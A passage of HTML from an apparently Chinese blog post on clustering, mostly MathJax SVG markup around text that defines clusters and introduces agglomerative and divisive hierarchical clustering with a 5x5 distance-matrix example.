577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(899,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1343.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></svg></mjx-container>的距离<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.575ex" height="2.236ex" role="img" focusable="false" viewBox="0 -694 1138.3 988.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g></g></g></svg></mjx-container>满足<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -1.238ex" xmlns="http://www.w3.org/2000/svg" width="29.319ex" height="3.195ex" role="img" focusable="false" viewBox="0 -864.9 12959.2 1412"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(1646.1,394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mrow" transform="translate(220,-370.3) scale(0.707)"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,-150) scale(0.707)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g><g data-mml-node="mo" transform="translate(1238.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1627.8,0)"><g data-mml-node="mi"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(633,-150) scale(0.707)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g><g data-mml-node="mo" transform="translate(2866.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(3644.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(4144.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><rect width="3405.7" height="60" x="120" y="220"></rect></g><g data-mml-node="munder" transform="translate(3812.4,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z"></path></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(899,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1566,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g><g data-mml-node="munder" transform="translate(6781.1,0)"><g data-mml-node="mo"><path data-c="2211" d="M61 748Q64 750 489 750H913L954 640Q965 609 976 579T993 533T999 516H979L959 517Q936 579 886 621T777 682Q724 700 655 705T436 710H319Q183 710 183 709Q186 706 348 484T511 259Q517 250 513 244L490 216Q466 188 420 134T330 27L149 -187Q149 -188 362 -188Q388 -188 436 -188T506 -189Q679 -189 778 -162T936 -43Q946 -27 959 6H999L913 -249L489 -250Q65 -250 62 -248Q56 -246 56 -239Q56 -234 118 -161Q186 -81 245 -11L428 206Q428 207 242 462L57 717L56 728Q56 744 61 748Z"></path></g><g data-mml-node="TeXAtom" transform="translate(1089,-285.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(946.3,0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1613.3,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g><g data-mml-node="msub" transform="translate(9783.4,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(11199.4,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(12255.2,0)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g></g></g></svg></mjx-container>且<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="7.332ex" height="2.236ex" role="img" focusable="false" viewBox="0 -694 3240.8 988.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1416.1,0)"><path data-c="2264" d="M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z"></path></g><g data-mml-node="mi" transform="translate(2471.8,0)"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g></g></g></svg></mjx-container>，则称G为一个类或簇。</p><h2 id="9-3-层次聚类"><a href="#9-3-层次聚类" class="headerlink" title="9.3 层次聚类"></a>9.3 层次聚类</h2><p>层次聚类假设类别之间存在层次结构，将样本聚到层次化的类中。因为每个样本只属于一个类，所以层次聚类属于硬聚类。</p><p>层次聚类又有聚合或自下而上聚类、分裂或自上而下聚类两种方法。</p><ul><li>聚合聚类开始将每个样本各自分到一个类，之后将相距最近的两类合并，建立一个新的类，重复此操作直到满足停止条件，得到层次化的类别。</li><li>分裂聚类开始将所有样本分到一个类，之后将已有类中相距最远的样本分到两个新的类，重复此操作直到满足停止条件，得到层次化的类别。</li></ul><h3 id="9-3-1-聚合聚类"><a href="#9-3-1-聚合聚类" class="headerlink" title="9.3.1 聚合聚类"></a>9.3.1 聚合聚类</h3><p>聚合聚类需要预先确定三个要素：距离或相似度、合并规则、停止条件。</p><p>聚合聚类算法：</p><img src="/posts/498ab7d9/%E5%9B%BE%E7%89%871.png" class="" title="聚类算法"><p>例子：给定5个样本的集合，样本之间的欧氏距离由如下矩阵D表示</p><script type="math/tex; mode=display">D=[d_{ij}]_{5×5}=\begin{pmatrix}0&7&2&9&3\\7&0&5&4&6\\2&5&0&8&1\\9&4&8&0&5\\3&6&1&5&0\end{pmatrix}</script><p>其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.666ex" xmlns="http://www.w3.org/2000/svg" width="2.575ex" height="2.236ex" role="img" focusable="false" viewBox="0 -694 1138.3 988.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(345,0)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 